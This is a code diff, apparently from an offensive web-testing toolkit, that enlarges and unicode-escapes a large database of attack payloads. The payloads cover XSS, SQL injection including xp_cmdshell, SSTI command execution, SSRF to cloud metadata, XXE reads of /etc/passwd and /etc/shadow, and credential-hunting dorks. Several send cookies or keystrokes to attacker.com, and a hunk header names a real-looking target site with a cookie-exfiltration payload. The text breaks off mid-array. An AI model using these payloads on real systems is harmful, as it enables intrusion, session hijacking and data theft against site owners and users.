@@ -1572,6 +1572,11 @@ https://target.cepal.org/search?q=&lt;svg/onload=fetch('https://attacker.com?c='
         <option value="lfi">LFI / Path Traversal</option>
         <option value="cmd">Command Injection</option>
         <option value="ssti">SSTI / Template Injection</option>
+        <option value="rce">RCE / Command Exec</option>
+        <option value="xxe">XXE Injection</option>
+        <option value="ssrf">SSRF</option>
+        <option value="nosqli">NoSQL Injection</option>
+        <option value="open_redirect">Open Redirect</option>
       </select>
       <select id="obf-technique" class="tk-input" style="flex:2;font-size:.75rem;">
         <option value="html_entities">HTML Entities</option>
@@ -2520,7 +2525,7 @@ function cmdDork(args){
 function cmdPayload(type){
   var t=(type||'xss').toLowerCase();
   var p={
-    xss:['<scr'+'ipt>alert(document.domain)</scr'+'ipt>','<img src=x onerror=alert(1)>','<svg onload=alert(1)>','<body onload=alert(1)>'],
+    xss:['\u003cscr\u0027+\u0027ipt\u003ealert(document.domain)\u003c/scr\u0027+\u0027ipt\u003e','\u003cimg src=x onerror=alert(1)\u003e','\u003csvg onload=alert(1)\u003e','\u003cbody onload=alert(1)\u003e'],
     sqli:["' OR '1'='1","' OR 1=1--","admin'--","1 UNION SELECT null,table_name FROM information_schema.tables--"],
     xxe:['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
   };
@@ -2859,7 +2864,7 @@ function buildAttackTree(){
 // ============================================================
 //  ARSENAL
 // ============================================================
-var PAYLOAD_DB=[{"id": 1, "cat": "XSS", "tag": "custom", "type": "Form Button", "payload": "<form><button formaction=javascript:alert(1)>_Y000!_"}, {"id": 2, "cat": "XSS", "tag": "custom", "type": "Marquee Form", "payload": "<marquee><form><button formaction=javascript:prompt(1)>_Y000!_</marquee>"}, {"id": 3, "cat": "XSS", "tag": "custom", "type": "Img Onmouseover", "payload": "<img/src='x' onmouseover=prompt(1)>"}, {"id": 4, "cat": "XSS", "tag": "custom", "type": "Img Onerror Cookie", "payload": "<Img src='/' onerror='prompt(document.cookie)'>"}, {"id": 5, "cat": "XSS", "tag": "custom", "type": "Marquee Onfinish", "payload": "<marquee loop=1 width=0 onfinish=alert(document.cookie)>Y000</marquee>"}, {"id": 6, "cat": "XSS", "tag": "custom", "type": "Onfocus Autofocus", "payload": "onfocus=alert(1) autofocus"}, {"id": 7, "cat": "XSS", "tag": "bypass", "type": "SVG Find Alert", "payload": "[comment]><svg onload=[document.domain].find(alert)>"}, {"id": 8, "cat": "XSS", "tag": "bypass", "type": "SVG Onload", "payload": "\"><svg/onload=alert(1)>"}, {"id": 9, "cat": "XSS", "tag": "bypass", "type": "SVG Eval Split", "payload": "<svg/onload=eval(\"ale\"+\"rt\")(1)>"}, {"id": 10, "cat": "XSS", "tag": "bypass", "type": "Noscript Title", "payload": "<noscript><p title=\"[/noscript]<img src=x onerror=alert(1)>\">"}, {"id": 11, "cat": "XSS", "tag": "bypass", "type": "Style Pointer", "payload": "\"Style=\"position:fixed;font-size:200px\"OnPointerEnter=\"alert(1)\""}, {"id": 12, "cat": "XSS", "tag": "bypass", "type": "B Style Fixed", "payload": "<b style=position:fixed;top:0;left:0;font-size:200px>XSS"}, {"id": 13, "cat": "XSS", "tag": "bypass", "type": "Script Noscript", "payload": "[comment]><img src=x onerror=alert(1)>"}, {"id": 14, "cat": "XSS", "tag": "basic", "type": "Script Alert", "payload": "[script]alert(document.domain)[/script]"}, {"id": 15, "cat": "XSS", "tag": "basic", "type": "Img Onerror", "payload": "<img src=x onerror=alert(1)>"}, {"id": 16, "cat": "XSS", "tag": "basic", "type": "SVG Onload", "payload": "<svg onload=alert(1)>"}, {"id": 17, "cat": "XSS", "tag": "basic", "type": "Body Onload", "payload": "<body onload=alert(1)>"}, {"id": 18, "cat": "XSS", "tag": "basic", "type": "Input Onfocus", "payload": "<input autofocus onfocus=alert(1)>"}, {"id": 19, "cat": "XSS", "tag": "redirect", "type": "Location Assign", "payload": "window.location.assign('http://evil.com')"}, {"id": 20, "cat": "XSS", "tag": "redirect", "type": "Document Location", "payload": "document.location = 'http://evil.com'"}, {"id": 21, "cat": "SQLi", "tag": "auth", "type": "Basic OR", "payload": "' OR '1'='1"}, {"id": 22, "cat": "SQLi", "tag": "auth", "type": "Comment Dash", "payload": "' OR 1=1--"}, {"id": 23, "cat": "SQLi", "tag": "auth", "type": "Admin Comment", "payload": "admin'--"}, {"id": 24, "cat": "SQLi", "tag": "auth", "type": "Admin Hash", "payload": "admin' #"}, {"id": 25, "cat": "SQLi", "tag": "auth", "type": "Admin OR True", "payload": "admin' or '1'='1"}, {"id": 26, "cat": "SQLi", "tag": "auth", "type": "Admin OR Dash", "payload": "admin' or '1'='1'--"}, {"id": 27, "cat": "SQLi", "tag": "auth", "type": "OR True Bool", "payload": "' or true--"}, {"id": 28, "cat": "SQLi", "tag": "auth", "type": "Double OR True", "payload": "\" or true--"}, {"id": 29, "cat": "SQLi", "tag": "auth", "type": "Paren OR True", "payload": "') or true--"}, {"id": 30, "cat": "SQLi", "tag": "auth", "type": "Double Paren", "payload": "\") or true--"}, {"id": 31, "cat": "SQLi", "tag": "union", "type": "Union Tables MSSQL", "payload": "union select table_name from (select top 1 table_name from information_schema.tables order by 1) as x order by 1 desc--"}, {"id": 32, "cat": "SQLi", "tag": "union", "type": "Union Columns MSSQL", "payload": "union select column_name from (select top 1 column_name from information_schema.columns where table_name='users' order by 1) as x order by 1 desc--"}, {"id": 33, "cat": "SQLi", "tag": "error", "type": "ExtractValue Version", "payload": "+and extractvalue(0x0a,concat(0x0a,(select version())))"}, {"id": 34, "cat": "SQLi", "tag": "error", "type": "UpdateXML Version", "payload": "+and updatexml(null,concat(0x0a,(select version())),null)"}, {"id": 35, "cat": "SQLi", "tag": "error", "type": "ExtractValue DB", "payload": "+and extractvalue(0x0a,concat(0x0a,(select database())))"}, {"id": 36, "cat": "SQLi", "tag": "error", "type": "ExtractValue Tables", "payload": "+and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))"}, {"id": 37, "cat": "SQLi", "tag": "info", "type": "Version", "payload": "@@version"}, {"id": 38, "cat": "SQLi", "tag": "info", "type": "User", "payload": "user()"}, {"id": 39, "cat": "SQLi", "tag": "info", "type": "Database", "payload": "database()"}, {"id": 40, "cat": "SQLi", "tag": "info", "type": "Tables", "payload": "select table_name from information_schema.tables where table_schema=database()"}, {"id": 41, "cat": "SQLi", "tag": "waf", "type": "Comment Null Byte", "payload": "; (0x00)"}, {"id": 42, "cat": "SQLi", "tag": "waf", "type": "Comment Double Dash", "payload": "-- (comment)"}, {"id": 43, "cat": "SQLi", "tag": "waf", "type": "Comment Hash", "payload": "# (comment)"}, {"id": 44, "cat": "SQLi", "tag": "waf", "type": "Comment Inline", "payload": "/**/ (inline comment)"}, {"id": 45, "cat": "Dorks", "tag": "admin", "type": "Admin Panel", "payload": "site:target.com inurl:admin"}, {"id": 46, "cat": "Dorks", "tag": "admin", "type": "Login Pages", "payload": "site:target.com inurl:login"}, {"id": 47, "cat": "Dorks", "tag": "admin", "type": "Dashboard", "payload": "site:target.com intitle:dashboard"}, {"id": 48, "cat": "Dorks", "tag": "files", "type": "Config Files", "payload": "site:target.com ext:conf OR ext:cfg OR ext:ini"}, {"id": 49, "cat": "Dorks", "tag": "files", "type": "SQL Dumps", "payload": "site:target.com ext:sql"}, {"id": 50, "cat": "Dorks", "tag": "files", "type": "Backup Files", "payload": "site:target.com ext:bak OR ext:backup"}, {"id": 51, "cat": "Dorks", "tag": "files", "type": "PHP Info", "payload": "site:target.com inurl:phpinfo.php"}, {"id": 52, "cat": "Dorks", "tag": "vuln", "type": "Error Messages", "payload": "site:target.com Warning: mysql_fetch OR syntax error"}, {"id": 53, "cat": "Dorks", "tag": "vuln", "type": "Open Redirects", "payload": "site:target.com inurl:redirect= OR inurl:url= OR inurl:next="}, {"id": 54, "cat": "XSS", "tag": "polyglot", "type": "0xsobky Ultimate", "payload": "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert(1) )// //"}, {"id": 55, "cat": "XSS", "tag": "polyglot", "type": "s0md3v Multi-Context", "payload": "javascript:/*--><svg onload='alert(1)'//"}, {"id": 56, "cat": "XSS", "tag": "polyglot", "type": "OWASP Polyglot", "payload": "javascript:/*--><svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>"}, {"id": 57, "cat": "XSS", "tag": "polyglot", "type": "Portswigger Polyglot", "payload": "javascript://'/onclick=alert()//>*/alert()/*"}, {"id": 58, "cat": "XSS", "tag": "polyglot", "type": "SecLists Polyglot", "payload": "'\";--><img src=x onerror=alert(1)><svg onload=alert(1)>"}, {"id": 59, "cat": "XSS", "tag": "encoding", "type": "HTML Entity href", "payload": "<a href=\"javascript:alert(1)\">Click</a>"}, {"id": 60, "cat": "XSS", "tag": "encoding", "type": "fromCharCode", "payload": "<a href=\"javascript:alert(String.fromCharCode(88,83,83))\">XSS</a>"}, {"id": 61, "cat": "XSS", "tag": "encoding", "type": "Double URL Encode", "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"}, {"id": 62, "cat": "XSS", "tag": "encoding", "type": "Base64 Data URI", "payload": "<iframe src=\"data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\"></iframe>"}, {"id": 63, "cat": "XSS", "tag": "dom", "type": "PostMessage DOM XSS", "payload": "window.postMessage('<img src=x onerror=alert(1)>','*')"}, {"id": 64, "cat": "XSS", "tag": "dom", "type": "InnerHTML Sink", "payload": "el.innerHTML='<img src=x onerror=alert(1)>'"}, {"id": 65, "cat": "XSS", "tag": "dom", "type": "Eval atob", "payload": "eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))"}, {"id": 66, "cat": "XSS", "tag": "dom", "type": "Location Hash", "payload": "#<img src=x onerror=alert(document.domain)>"}, {"id": 67, "cat": "XSS", "tag": "dom", "type": "Document Write", "payload": "document.write('<img src=x onerror=alert(1)>')"}, {"id": 68, "cat": "XSS", "tag": "framework", "type": "Angular Template Injection", "payload": "{{constructor.constructor('alert(1)')()}}"}, {"id": 69, "cat": "XSS", "tag": "framework", "type": "Angular ng-app", "payload": "<div ng-app>{{constructor.constructor('alert(document.domain)')()}}"}, {"id": 70, "cat": "XSS", "tag": "framework", "type": "Vue.js Template", "payload": "{{_c.constructor('alert(1)')()}}"}, {"id": 71, "cat": "XSS", "tag": "framework", "type": "Handlebars SSTI", "payload": "{{#with 'constructor'}}{{#with split}}{{pop}}{{push 'return alert(1)'}}{{pop}}{{/with}}{{/with}}"}, {"id": 72, "cat": "XSS", "tag": "blind", "type": "XSS Hunter Callback", "payload": "<img src=x onerror=\"this.src='https://xss.ht/?c='+document.cookie\">"}, {"id": 73, "cat": "XSS", "tag": "blind", "type": "Fetch Cookie Exfil", "payload": "<svg onload=\"fetch('https://attacker.com/log?d='+btoa(document.cookie))\">"}, {"id": 74, "cat": "XSS", "tag": "blind", "type": "Keylogger", "payload": "document.onkeypress=function(e){fetch('https://attacker.com/k?k='+e.key)}"}, {"id": 75, "cat": "SQLi", "tag": "blind-bool", "type": "Boolean True", "payload": "1 AND 1=1--"}, {"id": 76, "cat": "SQLi", "tag": "blind-bool", "type": "Boolean False", "payload": "1 AND 1=2--"}, {"id": 77, "cat": "SQLi", "tag": "blind-bool", "type": "Substring Enum", "payload": "1 AND SUBSTRING(username,1,1)='a'--"}, {"id": 78, "cat": "SQLi", "tag": "blind-bool", "type": "IF Condition", "payload": "1 AND IF(1=1,1,0)--"}, {"id": 79, "cat": "SQLi", "tag": "blind-bool", "type": "CASE Boolean", "payload": "1 AND CASE WHEN (1=1) THEN 1 ELSE 0 END--"}, {"id": 80, "cat": "SQLi", "tag": "blind-bool", "type": "Table Name Enum", "payload": "1 AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='u'--"}, {"id": 81, "cat": "SQLi", "tag": "time-based", "type": "MySQL SLEEP", "payload": "1' AND SLEEP(5)--"}, {"id": 82, "cat": "SQLi", "tag": "time-based", "type": "MySQL IF Sleep", "payload": "1 AND IF(1=1, SLEEP(5), 0)--"}, {"id": 83, "cat": "SQLi", "tag": "time-based", "type": "MySQL BENCHMARK", "payload": "1 AND BENCHMARK(10000000,MD5(1))--"}, {"id": 84, "cat": "SQLi", "tag": "time-based", "type": "MSSQL WAITFOR", "payload": "'; WAITFOR DELAY '0:0:5'--"}, {"id": 85, "cat": "SQLi", "tag": "time-based", "type": "PostgreSQL pg_sleep", "payload": "'; SELECT pg_sleep(5)--"}, {"id": 86, "cat": "SQLi", "tag": "time-based", "type": "Oracle DBMS_PIPE", "payload": "'; exec dbms_pipe.receive_message(('a'),5)--"}, {"id": 87, "cat": "SQLi", "tag": "oob", "type": "MSSQL xp_dirtree DNS", "payload": "'; exec master..xp_dirtree '//attacker.com/sqli'--"}, {"id": 88, "cat": "SQLi", "tag": "oob", "type": "Oracle UTL_HTTP", "payload": "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?q='||user) FROM dual--"}, {"id": 89, "cat": "SQLi", "tag": "oob", "type": "MySQL INTO OUTFILE", "payload": "1 UNION SELECT 1 INTO OUTFILE '//attacker.com/sqli'"}, {"id": 90, "cat": "SQLi", "tag": "stacked", "type": "Stacked MySQL INSERT", "payload": "1; INSERT INTO users(user,pass) VALUES('hacked','hacked')--"}, {"id": 91, "cat": "SQLi", "tag": "stacked", "type": "MSSQL xp_cmdshell", "payload": "1; EXEC xp_cmdshell('whoami')--"}, {"id": 92, "cat": "SQLi", "tag": "stacked", "type": "Second Order", "payload": "admin' + (SELECT TOP 1 password FROM users) + '"}, {"id": 93, "cat": "SQLi", "tag": "waf-adv", "type": "Tab Bypass", "payload": "1' OR '1'='1  [tab instead of space]"}, {"id": 94, "cat": "SQLi", "tag": "waf-adv", "type": "Case Variation", "payload": "1' oR '1'='1"}, {"id": 95, "cat": "SQLi", "tag": "waf-adv", "type": "Comment Frag", "payload": "1'/**/OR/**/1=1--"}, {"id": 96, "cat": "SQLi", "tag": "waf-adv", "type": "Hex String", "payload": "1 UNION SELECT 0x61646d696e,0x70617373--"}, {"id": 97, "cat": "SSTI", "tag": "detection", "type": "Detection Probe", "payload": "{{7*7}} ${7*7} #{7*7} *{7*7}"}, {"id": 98, "cat": "SSTI", "tag": "jinja2", "type": "Jinja2 RCE", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}, {"id": 99, "cat": "SSTI", "tag": "jinja2", "type": "Jinja2 Config", "payload": "{{config.items()}}"}, {"id": 100, "cat": "SSTI", "tag": "twig", "type": "Twig PHP RCE", "payload": "{{['id']|filter('system')}}"}, {"id": 101, "cat": "SSTI", "tag": "freemarker", "type": "FreeMarker RCE", "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"}, {"id": 102, "cat": "SSTI", "tag": "erb", "type": "ERB Ruby RCE", "payload": "<%= system('id') %>"}, {"id": 103, "cat": "SSRF", "tag": "basic", "type": "localhost", "payload": "http://localhost/admin"}, {"id": 104, "cat": "SSRF", "tag": "basic", "type": "AWS Metadata", "payload": "http://169.254.169.254/latest/meta-data/"}, {"id": 105, "cat": "SSRF", "tag": "basic", "type": "GCP Metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/"}, {"id": 106, "cat": "SSRF", "tag": "bypass", "type": "0.0.0.0", "payload": "http://0.0.0.0/admin"}, {"id": 107, "cat": "SSRF", "tag": "bypass", "type": "IPv6 localhost", "payload": "http://[::1]/admin"}, {"id": 108, "cat": "SSRF", "tag": "bypass", "type": "Decimal IP", "payload": "http://2130706433/admin"}, {"id": 109, "cat": "SSRF", "tag": "bypass", "type": "URL Redirect", "payload": "http://attacker.com@localhost/admin"}, {"id": 110, "cat": "XXE", "tag": "classic", "type": "XXE /etc/passwd", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>REF:xxe</foo>"}, {"id": 111, "cat": "XXE", "tag": "classic", "type": "XXE /etc/shadow", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>REF:xxe</foo>"}, {"id": 112, "cat": "XXE", "tag": "oob", "type": "XXE OOB DNS", "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker.com/\">%x;]>"}, {"id": 113, "cat": "XXE", "tag": "blind", "type": "XXE Blind DTD", "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % file SYSTEM \"file:///etc/passwd\">%file;]><r></r>"}, {"id": 114, "cat": "Dorks", "tag": "cloud", "type": "AWS S3 Open", "payload": "site:s3.amazonaws.com \"index of\""}, {"id": 115, "cat": "Dorks", "tag": "cloud", "type": "Azure Blob", "payload": "site:blob.core.windows.net \"index of\""}, {"id": 116, "cat": "Dorks", "tag": "cloud", "type": "Firebase DB", "payload": "site:firebaseio.com"}, {"id": 117, "cat": "Dorks", "tag": "cloud", "type": "GCS Exposed", "payload": "site:storage.googleapis.com \"index of\""}, {"id": 118, "cat": "Dorks", "tag": "creds", "type": "Pastebin Creds", "payload": "site:pastebin.com password OR username OR api_key"}, {"id": 119, "cat": "Dorks", "tag": "creds", "type": "GitHub Tokens", "payload": "site:github.com api_key OR secret_key OR access_token"}, {"id": 120, "cat": "Dorks", "tag": "creds", "type": "DB Conn Strings", "payload": "site:target.com \"mongodb://\" OR \"mysql://\" OR \"postgresql://\""}, {"id": 121, "cat": "Dorks", "tag": "creds", "type": "JWT Exposed", "payload": "site:target.com intext:eyJhbGciOiJIUzI1NiJ9"}, {"id": 122, "cat": "Dorks", "tag": "vuln-scan", "type": "Shodan Default Creds", "payload": "http.title:RouterOS OR http.title:Synology OR http.title:QNAP"}, {"id": 123, "cat": "Dorks", "tag": "vuln-scan", "type": "WordPress", "payload": "site:target.com inurl:wp-login.php"}];
+var PAYLOAD_DB=[{"id": 1, "cat": "XSS", "tag": "custom", "type": "Form Button", "payload": "\u003cform\u003e\u003cbutton formaction=javascript:alert(1)\u003e_Y000!_"}, {"id": 2, "cat": "XSS", "tag": "custom", "type": "Marquee Form", "payload": "\u003cmarquee\u003e\u003cform\u003e\u003cbutton formaction=javascript:prompt(1)\u003e_Y000!_\u003c/marquee\u003e"}, {"id": 3, "cat": "XSS", "tag": "custom", "type": "Img Onmouseover", "payload": "\u003cimg/src='x' onmouseover=prompt(1)\u003e"}, {"id": 4, "cat": "XSS", "tag": "custom", "type": "Img Onerror Cookie", "payload": "\u003cImg src='/' onerror='prompt(document.cookie)'\u003e"}, {"id": 5, "cat": "XSS", "tag": "custom", "type": "Marquee Onfinish", "payload": "\u003cmarquee loop=1 width=0 onfinish=alert(document.cookie)\u003eY000\u003c/marquee\u003e"}, {"id": 6, "cat": "XSS", "tag": "custom", "type": "Onfocus Autofocus", "payload": "onfocus=alert(1) autofocus"}, {"id": 7, "cat": "XSS", "tag": "bypass", "type": "SVG Find Alert", "payload": "[comment]\u003e\u003csvg onload=[document.domain].find(alert)\u003e"}, {"id": 8, "cat": "XSS", "tag": "bypass", "type": "SVG Onload", "payload": "\"\u003e\u003csvg/onload=alert(1)\u003e"}, {"id": 9, "cat": "XSS", "tag": "bypass", "type": "SVG Eval Split", "payload": "\u003csvg/onload=eval(\"ale\"+\"rt\")(1)\u003e"}, {"id": 10, "cat": "XSS", "tag": "bypass", "type": "Noscript Title", "payload": "\u003cnoscript\u003e\u003cp title=\"[/noscript]\u003cimg src=x onerror=alert(1)\u003e\"\u003e"}, {"id": 11, "cat": "XSS", "tag": "bypass", "type": "Style Pointer", "payload": "\"Style=\"position:fixed;font-size:200px\"OnPointerEnter=\"alert(1)\""}, {"id": 12, "cat": "XSS", "tag": "bypass", "type": "B Style Fixed", "payload": "\u003cb style=position:fixed;top:0;left:0;font-size:200px\u003eXSS"}, {"id": 13, "cat": "XSS", "tag": "bypass", "type": "Script Noscript", "payload": "[comment]\u003e\u003cimg src=x onerror=alert(1)\u003e"}, {"id": 14, "cat": "XSS", "tag": "basic", "type": "Script Alert", "payload": "[script]alert(document.domain)[/script]"}, {"id": 15, "cat": "XSS", "tag": "basic", "type": "Img Onerror", "payload": "\u003cimg src=x onerror=alert(1)\u003e"}, {"id": 16, "cat": "XSS", "tag": "basic", "type": "SVG Onload", "payload": "\u003csvg onload=alert(1)\u003e"}, {"id": 17, "cat": "XSS", "tag": "basic", "type": "Body Onload", "payload": "\u003cbody onload=alert(1)\u003e"}, {"id": 18, "cat": "XSS", "tag": "basic", "type": "Input Onfocus", "payload": "\u003cinput autofocus onfocus=alert(1)\u003e"}, {"id": 19, "cat": "XSS", "tag": "redirect", "type": "Location Assign", "payload": "window.location.assign('http://evil.com')"}, {"id": 20, "cat": "XSS", "tag": "redirect", "type": "Document Location", "payload": "document.location = 'http://evil.com'"}, {"id": 21, "cat": "SQLi", "tag": "auth", "type": "Basic OR", "payload": "' OR '1'='1"}, {"id": 22, "cat": "SQLi", "tag": "auth", "type": "Comment Dash", "payload": "' OR 1=1--"}, {"id": 23, "cat": "SQLi", "tag": "auth", "type": "Admin Comment", "payload": "admin'--"}, {"id": 24, "cat": "SQLi", "tag": "auth", "type": "Admin Hash", "payload": "admin' #"}, {"id": 25, "cat": "SQLi", "tag": "auth", "type": "Admin OR True", "payload": "admin' or '1'='1"}, {"id": 26, "cat": "SQLi", "tag": "auth", "type": "Admin OR Dash", "payload": "admin' or '1'='1'--"}, {"id": 27, "cat": "SQLi", "tag": "auth", "type": "OR True Bool", "payload": "' or true--"}, {"id": 28, "cat": "SQLi", "tag": "auth", "type": "Double OR True", "payload": "\" or true--"}, {"id": 29, "cat": "SQLi", "tag": "auth", "type": "Paren OR True", "payload": "') or true--"}, {"id": 30, "cat": "SQLi", "tag": "auth", "type": "Double Paren", "payload": "\") or true--"}, {"id": 31, "cat": "SQLi", "tag": "union", "type": "Union Tables MSSQL", "payload": "union select table_name from (select top 1 table_name from information_schema.tables order by 1) as x order by 1 desc--"}, {"id": 32, "cat": "SQLi", "tag": "union", "type": "Union Columns MSSQL", "payload": "union select column_name from (select top 1 column_name from information_schema.columns where table_name='users' order by 1) as x order by 1 desc--"}, {"id": 33, "cat": "SQLi", "tag": "error", "type": "ExtractValue Version", "payload": "+and extractvalue(0x0a,concat(0x0a,(select version())))"}, {"id": 34, "cat": "SQLi", "tag": "error", "type": "UpdateXML Version", "payload": "+and updatexml(null,concat(0x0a,(select version())),null)"}, {"id": 35, "cat": "SQLi", "tag": "error", "type": "ExtractValue DB", "payload": "+and extractvalue(0x0a,concat(0x0a,(select database())))"}, {"id": 36, "cat": "SQLi", "tag": "error", "type": "ExtractValue Tables", "payload": "+and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))"}, {"id": 37, "cat": "SQLi", "tag": "info", "type": "Version", "payload": "@@version"}, {"id": 38, "cat": "SQLi", "tag": "info", "type": "User", "payload": "user()"}, {"id": 39, "cat": "SQLi", "tag": "info", "type": "Database", "payload": "database()"}, {"id": 40, "cat": "SQLi", "tag": "info", "type": "Tables", "payload": "select table_name from information_schema.tables where table_schema=database()"}, {"id": 41, "cat": "SQLi", "tag": "waf", "type": "Comment Null Byte", "payload": "; (0x00)"}, {"id": 42, "cat": "SQLi", "tag": "waf", "type": "Comment Double Dash", "payload": "-- (comment)"}, {"id": 43, "cat": "SQLi", "tag": "waf", "type": "Comment Hash", "payload": "# (comment)"}, {"id": 44, "cat": "SQLi", "tag": "waf", "type": "Comment Inline", "payload": "/**/ (inline comment)"}, {"id": 45, "cat": "Dorks", "tag": "admin", "type": "Admin Panel", "payload": "site:target.com inurl:admin"}, {"id": 46, "cat": "Dorks", "tag": "admin", "type": "Login Pages", "payload": "site:target.com inurl:login"}, {"id": 47, "cat": "Dorks", "tag": "admin", "type": "Dashboard", "payload": "site:target.com intitle:dashboard"}, {"id": 48, "cat": "Dorks", "tag": "files", "type": "Config Files", "payload": "site:target.com ext:conf OR ext:cfg OR ext:ini"}, {"id": 49, "cat": "Dorks", "tag": "files", "type": "SQL Dumps", "payload": "site:target.com ext:sql"}, {"id": 50, "cat": "Dorks", "tag": "files", "type": "Backup Files", "payload": "site:target.com ext:bak OR ext:backup"}, {"id": 51, "cat": "Dorks", "tag": "files", "type": "PHP Info", "payload": "site:target.com inurl:phpinfo.php"}, {"id": 52, "cat": "Dorks", "tag": "vuln", "type": "Error Messages", "payload": "site:target.com Warning: mysql_fetch OR syntax error"}, {"id": 53, "cat": "Dorks", "tag": "vuln", "type": "Open Redirects", "payload": "site:target.com inurl:redirect= OR inurl:url= OR inurl:next="}, {"id": 54, "cat": "XSS", "tag": "polyglot", "type": "0xsobky Ultimate", "payload": "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert(1) )// //"}, {"id": 55, "cat": "XSS", "tag": "polyglot", "type": "s0md3v Multi-Context", "payload": "javascript:/*--\u003e\u003csvg onload='alert(1)'//"}, {"id": 56, "cat": "XSS", "tag": "polyglot", "type": "OWASP Polyglot", "payload": "javascript:/*--\u003e\u003csvg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'\u003e"}, {"id": 57, "cat": "XSS", "tag": "polyglot", "type": "Portswigger Polyglot", "payload": "javascript://'/onclick=alert()//\u003e*/alert()/*"}, {"id": 58, "cat": "XSS", "tag": "polyglot", "type": "SecLists Polyglot", "payload": "'\";--\u003e\u003cimg src=x onerror=alert(1)\u003e\u003csvg onload=alert(1)\u003e"}, {"id": 59, "cat": "XSS", "tag": "encoding", "type": "HTML Entity href", "payload": "\u003ca href=\"javascript:alert(1)\"\u003eClick\u003c/a\u003e"}, {"id": 60, "cat": "XSS", "tag": "encoding", "type": "fromCharCode", "payload": "\u003ca href=\"javascript:alert(String.fromCharCode(88,83,83))\"\u003eXSS\u003c/a\u003e"}, {"id": 61, "cat": "XSS", "tag": "encoding", "type": "Double URL Encode", "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"}, {"id": 62, "cat": "XSS", "tag": "encoding", "type": "Base64 Data URI", "payload": "\u003ciframe src=\"data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\"\u003e\u003c/iframe\u003e"}, {"id": 63, "cat": "XSS", "tag": "dom", "type": "PostMessage DOM XSS", "payload": "window.postMessage('\u003cimg src=x onerror=alert(1)\u003e','*')"}, {"id": 64, "cat": "XSS", "tag": "dom", "type": "InnerHTML Sink", "payload": "el.innerHTML='\u003cimg src=x onerror=alert(1)\u003e'"}, {"id": 65, "cat": "XSS", "tag": "dom", "type": "Eval atob", "payload": "eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))"}, {"id": 66, "cat": "XSS", "tag": "dom", "type": "Location Hash", "payload": "#\u003cimg src=x onerror=alert(document.domain)\u003e"}, {"id": 67, "cat": "XSS", "tag": "dom", "type": "Document Write", "payload": "document.write('\u003cimg src=x onerror=alert(1)\u003e')"}, {"id": 68, "cat": "XSS", "tag": "framework", "type": "Angular Template Injection", "payload": "{{constructor.constructor('alert(1)')()}}"}, {"id": 69, "cat": "XSS", "tag": "framework", "type": "Angular ng-app", "payload": "\u003cdiv ng-app\u003e{{constructor.constructor('alert(document.domain)')()}}"}, {"id": 70, "cat": "XSS", "tag": "framework", "type": "Vue.js Template", "payload": "{{_c.constructor('alert(1)')()}}"}, {"id": 71, "cat": "XSS", "tag": "framework", "type": "Handlebars SSTI", "payload": "{{#with 'constructor'}}{{#with split}}{{pop}}{{push 'return alert(1)'}}{{pop}}{{/with}}{{/with}}"}, {"id": 72, "cat": "XSS", "tag": "blind", "type": "XSS Hunter Callback", "payload": "\u003cimg src=x onerror=\"this.src='https://xss.ht/?c='+document.cookie\"\u003e"}, {"id": 73, "cat": "XSS", "tag": "blind", "type": "Fetch Cookie Exfil", "payload": "\u003csvg onload=\"fetch('https://attacker.com/log?d='+btoa(document.cookie))\"\u003e"}, {"id": 74, "cat": "XSS", "tag": "blind", "type": "Keylogger", "payload": "document.onkeypress=function(e){fetch('https://attacker.com/k?k='+e.key)}"}, {"id": 75, "cat": "SQLi", "tag": "blind-bool", "type": "Boolean True", "payload": "1 AND 1=1--"}, {"id": 76, "cat": "SQLi", "tag": "blind-bool", "type": "Boolean False", "payload": "1 AND 1=2--"}, {"id": 77, "cat": "SQLi", "tag": "blind-bool", "type": "Substring Enum", "payload": "1 AND SUBSTRING(username,1,1)='a'--"}, {"id": 78, "cat": "SQLi", "tag": "blind-bool", "type": "IF Condition", "payload": "1 AND IF(1=1,1,0)--"}, {"id": 79, "cat": "SQLi", "tag": "blind-bool", "type": "CASE Boolean", "payload": "1 AND CASE WHEN (1=1) THEN 1 ELSE 0 END--"}, {"id": 80, "cat": "SQLi", "tag": "blind-bool", "type": "Table Name Enum", "payload": "1 AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='u'--"}, {"id": 81, "cat": "SQLi", "tag": "time-based", "type": "MySQL SLEEP", "payload": "1' AND SLEEP(5)--"}, {"id": 82, "cat": "SQLi", "tag": "time-based", "type": "MySQL IF Sleep", "payload": "1 AND IF(1=1, SLEEP(5), 0)--"}, {"id": 83, "cat": "SQLi", "tag": "time-based", "type": "MySQL BENCHMARK", "payload": "1 AND BENCHMARK(10000000,MD5(1))--"}, {"id": 84, "cat": "SQLi", "tag": "time-based", "type": "MSSQL WAITFOR", "payload": "'; WAITFOR DELAY '0:0:5'--"}, {"id": 85, "cat": "SQLi", "tag": "time-based", "type": "PostgreSQL pg_sleep", "payload": "'; SELECT pg_sleep(5)--"}, {"id": 